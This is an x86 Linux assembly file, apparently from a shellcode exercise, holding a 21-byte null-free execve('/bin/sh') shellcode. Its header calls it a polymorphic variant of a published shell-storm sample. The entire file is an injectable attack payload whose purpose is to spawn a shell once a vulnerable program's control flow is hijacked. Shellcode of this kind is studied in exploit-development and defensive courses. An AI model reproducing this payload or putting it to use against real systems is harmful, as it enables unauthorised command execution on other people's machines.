;Linux/x86 execve /bin/sh shellcode
;21 bytes
;null-free

;Polimorphism of this shellcode http://www.shell-storm.org/shellcode/files/shellcode-827.php
;Author: Javier Tejedor

global _start 
 
section .text 
_start:

	xor eax,eax
	push eax
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx,esp
	mul ecx
	mov al,0xb
	int 0x80
